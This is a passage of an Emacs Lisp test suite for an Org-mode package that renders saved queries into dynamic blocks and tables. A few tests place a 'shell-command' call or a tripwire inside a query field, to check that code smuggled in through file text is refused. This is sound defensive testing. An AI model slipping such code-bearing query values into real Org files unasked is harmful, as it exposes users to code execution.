    (write-region "* TODO Pipe | title\n:PROPERTIES:\n:NEXT_REVIEW: [2020-01-02 Thu]\n:END:\n"
                  nil a t 'quiet)
    (org-dblock-update)
    (let ((line (org-agents-test--alias-line "Pipe")))
      (should (string-match-p "vert{}" line))
      ;; Two columns, so three bars: the escaped one is text, not a cell
      ;; boundary.
      (should (= 3 (cl-count ?| line))))))

(ert-deftest org-agents-test-dblock-table-sorts-then-limits ()
  "A row sort orders every match before `:AGENT_LIMIT:' cuts any of them.
`org-agents--collect' cannot cut to the limit first: it does not sort by
a rendered column at all, so it would keep whichever matches came first
and the sort would order only those."
  (org-agents-test--with-dblock-agent "table"
      (concat ":AGENT_COLUMNS: ITEM_BY_ID NEXT_REVIEW\n"
              ":AGENT_SORT: (ts-column 2)\n:AGENT_LIMIT: 1\n")
    ;; Later in the file than `Fix widget', but earlier in time.
    (write-region "* TODO Early item\n:PROPERTIES:\n:NEXT_REVIEW: [2019-01-01 Tue]\n:END:\n"
                  nil a t 'quiet)
    (org-dblock-update)
    (let ((s (buffer-string)))
      (should (string-match-p "Early item" s))
      (should-not (string-match-p "Fix widget" s))
      (should (= 1 org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-inline-params-override ()
  "A block's own parameters override the properties of its agent."
  (org-agents-test--with-dblock-agent "list" ""
    (end-of-line)
    (insert " :view table :columns \"ITEM_BY_ID NEXT_REVIEW\"")
    (beginning-of-line)
    (org-dblock-update)
    (let ((s (buffer-string)))
      (should (string-match-p "| *ITEM_BY_ID *| *NEXT_REVIEW *|" s))
      (should-not (string-match-p "^- " s)))))

(ert-deftest org-agents-test-dblock-standalone-expands-inline-query ()
  "A block with its own query needs no agent entry, and is expanded.
The `$PROP' layer is the query language whether the query comes from a
property drawer or from the block header; unexpanded, `$NEXT_REVIEW'
would reach org-ql as a void variable."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-max))
      (insert "\n* Notes\n\n#+BEGIN: org-agents :query (and (todo) $NEXT_REVIEW)"
              " :scope (\"" a "\") :format \"NEXT_REVIEW\"\n#+END:\n")
      (re-search-backward "#\\+BEGIN: org-agents")
      (org-dblock-update)
      (should (string-match-p "^- \\[\\[id:11111111-.*\\[2020-01-01 Wed\\]"
                              (buffer-string)))
      (should (= 1 org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-standalone-gates-inline-query ()
  "A block header is a file's text like a property drawer, and is gated.
The tripwire records any evaluation the gate was supposed to prevent."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-max))
      (insert "\n* Notes\n\n#+BEGIN: org-agents"
              " :query (and (todo) (tags (org-agents-test--tripwire)))"
              " :scope (\"" a "\")\n#+END:\n")
      (re-search-backward "#\\+BEGIN: org-agents")
      (let ((org-agents--session-approved (make-hash-table :test 'equal))
            (org-agents-safe-queries nil)
            (noninteractive t)
            (org-agents-test--tripwire-count 0))
        (org-dblock-update)
        (should (= 0 org-agents-test--tripwire-count))
        (should (null org-agents--last-count))
        (should (equal "" (string-trim (org-agents-test--dblock-body))))))))

(ert-deftest org-agents-test-dblock-without-a-query-is-diagnosed ()
  "A block under no agent, supplying no query, has nothing to render.
It says so and leaves the body it was given, rather than emptying the
block over a question the user was never asked."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-max))
      (insert "\n* Notes\n\n#+BEGIN: org-agents\nhand written\n#+END:\n")
      (re-search-backward "#\\+BEGIN: org-agents")
      (org-dblock-update)
      (should (equal "hand written\n" (org-agents-test--dblock-body)))
      (should (null org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-unresolved-match-renders-plain ()
  "A match that cannot be located has no entry to read a column at.
It is rendered as its recorded heading, marked `(?)', and its other
cells are empty.  `AGENT_VIEW' is the column here because the block's
own entry carries one: a detached marker leaves point where it stands,
so a cell read without checking the marker would answer with the
agent's own property and call it the match's."
  (org-agents-test--with-dblock-agent "table"
      ":AGENT_COLUMNS: ITEM_BY_ID AGENT_VIEW\n"
    (cl-letf (((symbol-function 'org-agents--collect)
               (lambda (&rest _)
                 (list (org-element-create
                        'headline (list :raw-value "Vanished entry"
                                        :org-hd-marker (make-marker)))))))
      (org-dblock-update)
      (let ((line (org-agents-test--alias-line "Vanished")))
        (should (string-match-p (regexp-quote "Vanished entry (?)") line))
        (should (= 3 (cl-count ?| line)))
        (should (string-blank-p (nth 2 (split-string line "|")))))
      (should (= 1 org-agents--last-count)))))

(ert-deftest org-agents-test-dblock-list-format-absent-adds-nothing ()
  "Properties the match does not carry add nothing, not even a separator.
`org-agents--format-suffix' joins the values it read, so two properties
neither of which is there read as the separator between them."
  (org-agents-test--with-dblock-agent "list"
      ":AGENT_FORMAT: NO_SUCH_A NO_SUCH_B\n"
    (org-dblock-update)
    (should (string-suffix-p "]]" (org-agents-test--alias-line "Fix widget")))))

(ert-deftest org-agents-test-table-cell ()
  "A cell may not carry a bar that would read as a cell boundary."
  (should (equal "a \\vert{} b" (org-agents--table-cell "a | b")))
  (should (equal "" (org-agents--table-cell nil))))

(ert-deftest org-agents-test-sort-rows ()
  "How a table's own sorts order rendered rows, and what they refuse."
  (let ((rows '(("b" "[2020-01-02 Thu]") ("a" "[2020-01-01 Wed]") ("c" "")))
        (columns '("X" "Y")))
    ;; A column sort compares the rendered cells as strings.
    (should (equal '("a" "b" "c")
                   (mapcar #'car (org-agents--sort-rows
                                  (copy-sequence rows) '(column 1) columns))))
    ;; A timestamp column reads them as times instead, and a cell that
    ;; names no time sorts after every cell that does: an entry with no
    ;; date is not an entry dated the epoch.
    (should (equal '("a" "b" "c")
                   (mapcar #'car (org-agents--sort-rows
                                  (copy-sequence rows) '(ts-column 2) columns))))
    ;; Any other sort is org-ql's, and leaves the rows as they came.
    (should (equal '("b" "a" "c")
                   (mapcar #'car (org-agents--sort-rows
                                  (copy-sequence rows) 'date columns))))
    (should (equal '("b" "a" "c")
                   (mapcar #'car (org-agents--sort-rows
                                  (copy-sequence rows) nil columns))))
    ;; A column that is not there is diagnosed, rather than reaching
    ;; `string<' as the nil `nth' would answer.
    (should-error (org-agents--sort-rows rows '(column 3) columns)
                  :type 'user-error)
    (should-error (org-agents--sort-rows rows '(column 0) columns)
                  :type 'user-error)
    (should-error (org-agents--sort-rows rows '(ts-column "2") columns)
                  :type 'user-error)))

;;;; Commands

(ert-deftest org-agents-test-update-writes-matched ()
  "The children view renders, and what it matched is recorded after.
`:AGENT_MATCHED:' is written once however many times the agent is
updated, because `org-entry-put' replaces the value it finds."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-agents-update)
      (let ((val (org-entry-get nil "AGENT_MATCHED")))
        (should val)
        (should (string-match-p "\\`1 \\[[0-9]\\{4\\}-" val))
        ;; A whole inactive timestamp, which is what Org reads back.
        (should (string-match-p
                 (concat "\\`1 \\[[0-9]\\{4\\}-[0-9]\\{2\\}-[0-9]\\{2\\} "
                         ".+ [0-9]\\{2\\}:[0-9]\\{2\\}\\]\\'")
                 val)))
      (should (string-match-p "Fix widget" (buffer-string)))
      (goto-char (point-min))
      (org-agents-update)
      (should (= 1 (cl-count-if
                    (lambda (l) (string-match-p ":AGENT_MATCHED:" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-writes-a-block-view ()
  "A list agent with no block yet is given one, and renders into it.
`:AGENT_MATCHED:' is written only once `org-update-dblock' has returned:
written from inside the writer, it would add a line to a drawer above the
very block whose bounds Org worked out before calling it."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      ;; `org-update-dblock' indents in the selected window's buffer,
      ;; which in batch is not this one unless it is put there.
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-min))
      (org-agents-update)
      (should (equal "1" (car (split-string
                               (org-entry-get nil "AGENT_MATCHED")))))
      (should (string-match-p "^- \\[\\[id:11111111-" (buffer-string)))
      ;; A second update leaves one block, one item and one record.
      (goto-char (point-min))
      (org-agents-update)
      (let ((lines (split-string (buffer-string) "\n")))
        (dolist (re '("^#\\+BEGIN: org-agents" "^#\\+END:" "^- \\[\\[id:"
                      ":AGENT_MATCHED:"))
          (should (= 1 (cl-count-if (lambda (l) (string-match-p re l))
                                    lines))))))))

(ert-deftest org-agents-test-update-writes-an-indented-block ()
  "An indented block keeps its indentation, and the record still lands.
`org-update-dblock' indents the body once the writer returns, and
`:AGENT_MATCHED:' is written after that: written from inside the writer
instead, it would move a block whose bounds Org had already worked out."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "  #+BEGIN: org-agents\n  #+END:\n")
      (goto-char (point-min))
      (org-agents-update)
      (should (string-match-p "^  - \\[\\[id:11111111-" (buffer-string)))
      (should (equal "1" (car (split-string
                               (org-entry-get nil "AGENT_MATCHED")))))
      ;; A second update neither indents the body twice over nor writes a
      ;; second item.
      (goto-char (point-min))
      (org-agents-update)
      (let ((lines (split-string (buffer-string) "\n")))
        (should (= 1 (cl-count-if
                      (lambda (l) (string-match-p "^  - \\[\\[id:" l))
                      lines)))
        (should-not (cl-find-if (lambda (l) (string-match-p "^    - " l))
                                lines))))))

(ert-deftest org-agents-test-update-list-view-creates-block ()
  "The list branch creates the block on first update, then reads its count.
No window shows this buffer, which is the state every agent is in during
an update over a file set."
  (org-agents-test--with-corpus
    (set-window-buffer (selected-window) (get-buffer-create "*scratch*"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-min))
      (org-agents-update)
      (should (string-match-p "#\\+BEGIN: org-agents" (buffer-string)))
      (should (string-match-p "^- \\[\\[id:11111111-" (buffer-string)))
      ;; The property is written above the block, and the block survives it.
      (should (equal "1" (car (split-string
                               (org-entry-get nil "AGENT_MATCHED"))))))))

(ert-deftest org-agents-test-update-list-view-is-idempotent ()
  "A second update writes into the block it wrote, not beside it."
  (org-agents-test--with-corpus
    (set-window-buffer (selected-window) (get-buffer-create "*scratch*"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (dotimes (_ 2) (goto-char (point-min)) (org-agents-update))
      (should (= 1 (cl-count-if
                    (lambda (l) (string-match-p "#\\+BEGIN: org-agents" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-reports-a-failed-block-render ()
  "A render that failed must not be reported with an older count.
The refusal here is a real one -- an unapproved residual query, refused
inside the writer -- rather than a stubbed failure."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-min))
      (org-agents-update)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_QUERY"
                     "(and (string-match \"x\" (or (org-entry-get nil \"ID\") \"\")))")
      (goto-char (point-min))
      (let ((org-agents--session-approved (make-hash-table :test 'equal))
            (org-agents-safe-queries nil)
            (noninteractive t))
        (let ((err (should-error (org-agents-update) :type 'user-error)))
          ;; What the render failed with, not merely that it failed.
          (should (string-match-p "not approved" (cadr err)))
          (should (string-match-p "Review agent" (cadr err)))))
      ;; The previous body is back and the previous count still describes it.
      (should (string-match-p "^- \\[\\[id:11111111-" (buffer-string)))
      (should (string-match-p "\\`1 \\[" (org-entry-get nil "AGENT_MATCHED"))))))

(ert-deftest org-agents-test-update-buffer-indents-in-the-right-buffer ()
  "An indented block survives an update of a buffer no window shows.
`org-update-dblock' indents the body the writer wrote by selecting the
window it was called from and working in whatever buffer that window
shows.  Over a buffer nothing displays -- every agent of an update over a
file set -- that is a stranger's buffer, where the pass fails, or worse
indents a block that is none of ours."
  (org-agents-test--with-corpus
    (set-window-buffer (selected-window) (get-buffer-create "*scratch*"))
    (with-temp-file agent-file
      (insert "* Block agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:AGENT_VIEW: list\n:END:\n"
              "  #+BEGIN: org-agents\n  #+END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (should (string-match-p "updated 1 agent\\'" (org-agents-update-buffer)))
      (should (string-match-p "^  - \\[\\[id:11111111-" (buffer-string)))
      ;; The window is where it was, still showing what it showed.
      (should (equal "*scratch*" (buffer-name (window-buffer (selected-window)))))
      ;; A second update neither drops the indentation nor doubles it.
      (org-agents-update-buffer)
      (let ((lines (split-string (buffer-string) "\n")))
        (should (= 1 (cl-count-if (lambda (l) (string-match-p "^  - \\[\\[id:" l))
                                  lines)))
        (should-not (cl-find-if (lambda (l) (string-match-p "^    - " l))
                                lines))))))

(ert-deftest org-agents-test-update-writes-the-block-at-point ()
  "One agent may carry several blocks; an update writes the one at point.
The first block of the agent's subtree need not be the block the user is
standing in."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "#+BEGIN: org-agents\n#+END:\n\n#+BEGIN: org-agents\n#+END:\n")
      (re-search-backward "#\\+BEGIN: org-agents")
      (forward-line 1)                  ; inside the second block
      (org-agents-update)
      (goto-char (point-min))
      (let ((second (progn (re-search-forward "#\\+BEGIN: org-agents")
                           (re-search-forward "#\\+BEGIN: org-agents")))
            (item (progn (goto-char (point-min))
                         (re-search-forward "^- \\[\\[id:"))))
        (should (< second item))
        (should (= 1 (cl-count-if
                      (lambda (l) (string-match-p "^- \\[\\[id:" l))
                      (split-string (buffer-string) "\n"))))))))

(ert-deftest org-agents-test-update-buffer-refreshes-every-block ()
  "An agent carrying several blocks has EVERY one of them refreshed.
`org-agents--goto-block' stopped at the first, so
`org-agents-update-buffer', `org-agents-update-all' and the save path
refreshed one view and left the rest as they were WITH NO INDICATION THAT
THEY WERE STALE.  REPRODUCED before the fix: a three-block list agent
came back with block 1 rendered and blocks 2 and 3 empty, and
`:AGENT_MATCHED:' stamped as though the agent were up to date.  Silence
about a stale render is the same class of defect this package refuses
elsewhere.

The second block is a TABLE, so it cannot pass by receiving a copy of the
first: it has to hold `|' rows of its own.  The third is `:limit 1', which
is what makes the `:AGENT_MATCHED:' claim below testable -- MEASURED, the
same agent's three blocks wrote 2, 2 and 1 items, so \"the agent's count\"
is not a well-defined thing and the FIRST block's count is what the
property holds.

The idempotence arm at the end is what protects the byte-identical save:
refreshing every block twice must leave the buffer as it was, or a save of
a file whose agents found nothing new would stop reaching disk unchanged."
  (org-agents-test--with-corpus
    ;; A second match, so that `:limit 1' below has something to limit and
    ;; the three blocks' counts really do differ.
    (with-temp-buffer
      (insert "* TODO Fix the other widget\n:PROPERTIES:\n"
              ":ID: 33333333-3333-3333-3333-333333333333\n"
              ":NEXT_REVIEW: [2020-01-02 Thu]\n:END:\n")
      (append-to-file (point-min) (point-max) a))
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "#+BEGIN: org-agents\n#+END:\n\n"
              "#+BEGIN: org-agents :view table :columns \"ITEM_BY_ID NEXT_REVIEW\"\n"
              "#+END:\n\n"
              "#+BEGIN: org-agents :limit 1\n#+END:\n")
      (org-agents-update-buffer)
      (let ((bodies (org-agents-test--block-bodies)))
        (should (= 3 (length bodies)))
        ;; Every one of them wrote something.
        (dolist (body bodies)
          (should-not (string-empty-p (string-trim body))))
        ;; The list blocks hold items and the table holds a table: the
        ;; second did not pass by receiving a copy of the first.
        (should (string-match-p "^- \\[\\[id:" (nth 0 bodies)))
        (should (string-match-p "|" (nth 1 bodies)))
        (should (string-match-p "^- \\[\\[id:" (nth 2 bodies)))
        ;; `:limit 1' really did limit, so the three counts differ and the
        ;; property below is a choice rather than a coincidence.
        (should (= 2 (cl-count-if (lambda (l) (string-match-p "^- \\[\\[id:" l))
                                  (split-string (nth 0 bodies) "\n"))))
        (should (= 1 (cl-count-if (lambda (l) (string-match-p "^- \\[\\[id:" l))
                                  (split-string (nth 2 bodies) "\n")))))
      ;; `:AGENT_MATCHED:' is the FIRST block's count, in buffer order.
      (goto-char (point-min))
      (should (string-match-p "\\`2 " (org-entry-get nil "AGENT_MATCHED")))
      ;; Idempotent: a second refresh-all moves nothing.  This is the
      ;; property the save path depends on.
      (let ((before (org-agents-test--masked-buffer-text)))
        (org-agents-update-buffer)
        (should (equal before (org-agents-test--masked-buffer-text))))
      (set-buffer-modified-p nil))))

(ert-deftest org-agents-test-update-finds-only-its-own-block ()
  "The block an agent renders into is one in the agent's own entry.
A block under a child heading is that child's -- the writer reads the
properties of the heading a block sits under -- so adopting it would
render one agent into another's view."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "** A child of the agent\n#+BEGIN: org-agents\n#+END:\n")
      (goto-char (point-min))
      (org-agents-update)
      (let* ((text (buffer-string))
             (child (string-match "^\\*\\* A child of the agent" text))
             (item (string-match "^- \\[\\[id:" text)))
        ;; The agent opened a block of its own, above its child; the
        ;; child's block was left as empty as it was found.
        (should item)
        (should (< item child))))))

(ert-deftest org-agents-test-update-reads-the-block-name-org-does ()
  "A block is ours by the name Org reads out of it, not by its spelling.
A name that merely starts with ours belongs to somebody else, and writing
into it would call a dblock writer that does not exist; `#+begin:' in
lower case is a block Org reads like any other."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "#+BEGIN: org-agentsX\n#+END:\n")
      (goto-char (point-min))
      (org-agents-update)
      (should (string-match-p "^- \\[\\[id:" (buffer-string)))
      ;; A block of our own was opened; the stranger was not written into.
      (should (= 1 (cl-count-if
                    (lambda (l) (string-match-p "^#\\+BEGIN: org-agents\\'" l))
                    (split-string (buffer-string) "\n"))))))
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-max))
      (insert "#+begin: org-agents\n#+end:\n")
      (goto-char (point-min))
      (org-agents-update)
      ;; Written into the block that was there, not beside it: one block
      ;; in the buffer, counted case-insensitively as Org reads them.
      (should (string-match-p "^- \\[\\[id:" (buffer-string)))
      (should (= 1 (cl-count-if
                    (lambda (l) (string-match-p "^#\\+begin: org-agents" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-a-standalone-block ()
  "A block supplying its own query renders where no agent entry does.
There is no agent to record `:AGENT_MATCHED:' on, so nothing is recorded."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-max))
      (insert "* Not an agent\nsome text of the user's\n"
              "#+BEGIN: org-agents :query (todo) :scope (\"" a "\")\n#+END:\n")
      (re-search-backward "#\\+BEGIN: org-agents")
      (org-agents-update)
      (should (string-match-p "^- \\[\\[id:11111111-" (buffer-string)))
      (org-back-to-heading t)
      (should-not (org-entry-get nil "AGENT_MATCHED")))))

(ert-deftest org-agents-test-update-refuses-where-there-is-nothing ()
  "Neither an agent nor a block: there is nothing at point to update."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect b)
      (goto-char (point-min))
      (should-error (org-agents-update) :type 'user-error))))

(ert-deftest org-agents-test-update-names-the-agent-it-refused ()
  "A refusal says whose query it was, and records nothing.
`org-agents--collect' refuses an unapproved query without naming the
agent it came from, and an update over a buffer or a corpus answers for
many of them."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_QUERY" "(and (todo) (shell-command \"x\"))")
      (goto-char (point-min))
      (let ((org-agents--session-approved (make-hash-table :test 'equal))
            (org-agents-safe-queries nil)
            (noninteractive t))
        (let ((err (should-error (org-agents-update) :type 'user-error)))
          (should (string-match-p "Review agent" (cadr err)))
          (should (string-match-p "not approved" (cadr err)))
          ;; One diagnosis, not this package's prefix twice over.
          (should (string-match-p "\\`org-agents: [^:]" (cadr err)))))
      (should-not (org-entry-get nil "AGENT_MATCHED")))))

(ert-deftest org-agents-test-update-children-failure-changes-nothing ()
  "A children render that fails part way leaves the agent as it was.
The view deletes the aliases it is about to write again before it writes
any of them, so a failure in the middle would leave the agent half
rewritten -- and `:AGENT_MATCHED:' must record no count for it."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-entry-put nil "AGENT_QUERY" "(property \"NEXT_REVIEW\")")
      (goto-char (point-min))
      (org-agents-update)               ; two aliases
      ;; Annotate the first alias, so the next round keeps and retitles
      ;; it -- after it has deleted the pristine second one.
      (goto-char (point-min))
      (search-forward "Fix widget")
      (org-end-of-subtree t t)
      (insert "*** mine\n")
      (let ((before (buffer-string)))
        (cl-letf (((symbol-function 'org-agents--mark-stale)
                   (lambda (&rest _) (error "boom"))))
          (goto-char (point-min))
          (should-error (org-agents-update) :type 'error))
        (should (equal before (buffer-string)))))))

(ert-deftest org-agents-test-update-block-failure-records-nothing ()
  "A block whose render failed reports it, and records no count.
The writer catches its own failures, puts the previous body back and
returns, so the only sign left for the command is that it wrote no
count at all -- and the count of an older render must not be recorded
in its place."
  (org-agents-test--with-corpus
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (goto-char (point-min))
      (org-entry-put nil "AGENT_VIEW" "list")
      (goto-char (point-min))
      (cl-letf (((symbol-function 'org-agents--collect)
                 (lambda (&rest _) (error "the corpus caught fire"))))
        (let ((err (should-error (org-agents-update) :type 'user-error)))
          (should (string-match-p "Review agent" (cadr err)))
          ;; What it failed with, and not merely that it failed: the
          ;; summary of an update over a file set is all the user sees.
          (should (string-match-p "the corpus caught fire" (cadr err)))))
      (should-not (org-entry-get nil "AGENT_MATCHED")))))

(ert-deftest org-agents-test-buffer-agents-marks-the-headline ()
  "Every marker names its agent's own headline, not a line inside it.
`org-agents--entry-get' runs `org-entry-get', which searches for the
drawer itself, so the match data after it describes whatever Org's
property machinery matched last -- measured as the entry's LAST PROPERTY
LINE.  Reading `match-beginning' there put every marker several lines
below its heading.  Nothing rendered wrong, because `--read-agent'
recomputes the marker and `org-entry-get' works from anywhere in an
entry, but the docstring's promise was false and every failure summary
named the wrong line."
  (dolist (cache (list nil (default-value 'org-element-use-cache)))
    (with-temp-buffer
      (org-mode)
      (setq-local org-element-use-cache cache)
      (insert "* First agent\n:PROPERTIES:\n:AGENT_QUERY: (todo)\n"
              ":AGENT_SCOPE: agenda\n:END:\n"
              "* Not an agent\n:PROPERTIES:\n:NOTE: mine\n:END:\n"
              "* Second agent\n:PROPERTIES:\n:AGENT_QUERY: (todo)\n"
              ":AGENT_SCOPE: agenda\n:END:\n")
      (let ((markers (org-agents--buffer-agents)))
        (should (= 2 (length markers)))
        (dolist (pair (cl-mapcar #'cons markers '("First agent" "Second agent")))
          (org-with-point-at (car pair)
            ;; On the heading itself: at its very first character, and the
            ;; line reads as the headline it belongs to.
            (should (looking-at-p org-outline-regexp-bol))
            (should (equal (cdr pair) (org-get-heading t t t t)))
            (should (= (point) (line-beginning-position)))))))))

(ert-deftest org-agents-test-update-buffer-names-the-agents-own-line ()
  "A failure summary names the line the agent's heading is on.
`org-agents--agent-label' reads `line-number-at-pos' at the marker, so a
marker that had drifted into the drawer reported an agent whose heading
is on line 1 as though it were three lines further down."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* Broken agent\n:PROPERTIES:\n:AGENT_QUERY: (and (todo\n"
              ":AGENT_SCOPE: agenda\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (let ((report (org-agents-update-buffer)))
        (should (string-match-p "1 failed" report))
        (should (string-match-p "Broken agent" report))
        ;; Line 1, which is where the heading is -- not line 3, where the
        ;; unreadable property sits, nor line 4, the drawer's last line.
        (should (string-match-p "agents\\.org:1)" report))))))

(ert-deftest org-agents-test-update-buffer-updates-an-agent-after-a-block ()
  "An agent following a block-view agent renders its own view.
The first agent has no block yet, so one is written at the end of its
meta-data -- which, its drawer being followed only by the next heading,
is exactly where the second agent's anchor sits.  With a marker of the
default insertion type that anchor does not advance, so the second agent
is found inside the block just written, renders the FIRST agent's block
again, and silently never renders its own: no block, no AGENT_MATCHED,
yet counted as updated.  Found by running the package on a real file."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* Block agent first\n:PROPERTIES:\n"
              ":AGENT_QUERY: (property \"NEXT_REVIEW\")\n"
              ":AGENT_VIEW:  list\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Block agent second\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_VIEW:  list\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (set-window-buffer (selected-window) (current-buffer))
      (org-agents-update-buffer)
      ;; Both agents carry a count, and the buffer holds two blocks.
      (goto-char (point-min))
      (should (org-entry-get nil "AGENT_MATCHED"))
      (search-forward "* Block agent second")
      (should (org-entry-get nil "AGENT_MATCHED"))
      (should (= 2 (cl-count-if
                    (lambda (l) (string-match-p "#\\+BEGIN: org-agents" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-buffer-updates-every-agent ()
  "Every agent in the buffer, each rendering under its own heading.
That the agents are collected as markers before any of them renders is
what `org-agents-test-buffer-agents-marks-the-headline' pins; the
guarantee this test carries is narrower and is Task 7's: an alias
inserted at the end of the first agent's subtree does not move the second
agent's anchor, so each agent's aliases land under it."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* First agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Second agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (property \"NEXT_REVIEW\")\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (let ((report (org-agents-update-buffer)))
        (should (string-match-p "updated 2 agents" report))
        (should-not (string-match-p "failed" report)))
      (goto-char (point-min))
      (should (equal "1" (car (split-string
                               (org-entry-get nil "AGENT_MATCHED")))))
      (search-forward "* Second agent")
      (should (equal "2" (car (split-string
                               (org-entry-get nil "AGENT_MATCHED")))))
      ;; Each agent's aliases landed under it: the first agent's one
      ;; alias sits above the second agent's heading, and the second
      ;; agent's two below it.
      (let ((second (progn (goto-char (point-min))
                           (search-forward "* Second agent"))))
        (goto-char (point-min))
        (should (< (search-forward "Fix widget") second))
        (should (> (progn (goto-char (point-min))
                          (search-forward "Old thing"))
                   second)))
      (should (= 3 (cl-count-if
                    (lambda (l) (string-match-p ":AGENT_MATCH: t" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-buffer-widens ()
  "Every agent in the buffer, whatever the buffer is narrowed to.
An update asked for from a narrowed buffer -- a subtree the user is
working in -- is still an update of the buffer, and the narrowing is
left as it was found."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* First agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Second agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (property \"NEXT_REVIEW\")\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (org-narrow-to-subtree)
      (should (string-match-p "updated 2 agents" (org-agents-update-buffer)))
      (should (buffer-narrowed-p))
      (widen)
      (should (= 2 (cl-count-if
                    (lambda (l) (string-match-p ":AGENT_MATCHED:" l))
                    (split-string (buffer-string) "\n")))))))

(ert-deftest org-agents-test-update-buffer-ignores-what-is-not-an-agent ()
  "Only an entry whose own drawer carries a query is an agent.
The property name is looked for as text, so an entry that merely
mentions it, or writes it with nothing after it, must not be reported as
an agent that failed to update."
  (org-agents-test--with-corpus
    (with-temp-file agent-file
      (insert "* Real agent\n:PROPERTIES:\n"
              ":AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n"
              ":AGENT_SCOPE: (\"" a "\")\n:END:\n"
              "* Talks about agents\nWrite :AGENT_QUERY: (todo) in a drawer.\n"
              "* Blank\n:PROPERTIES:\n:AGENT_QUERY:\n:END:\n"))
    (with-current-buffer (find-file-noselect agent-file)
      (let ((report (org-agents-update-buffer)))
        (should (string-match-p "updated 1 agent\\'" report))
        (should-not (string-match-p "failed" report))))))

(ert-deftest org-agents-test-update-all-continues-past-failure ()
  "One bad agent leaves the rest of them updated, and is named for it."
  (org-agents-test--with-corpus
    ;; Add a second agent with an unreadable query above the good one.
    (with-current-buffer (find-file-noselect agent-file)
      (goto-char (point-min))
      (insert "* Broken agent\n:PROPERTIES:\n:AGENT_QUERY: (and (todo\n:END:\n")
      (save-buffer))
    (let* ((org-agents-files (list agent-file))
           (report (org-agents-update-all)))
      (should (string-match-p "updated 1 agent" report))
      (should (string-match-p "1 failed" report))
      (should (string-match-p "Broken agent" report))
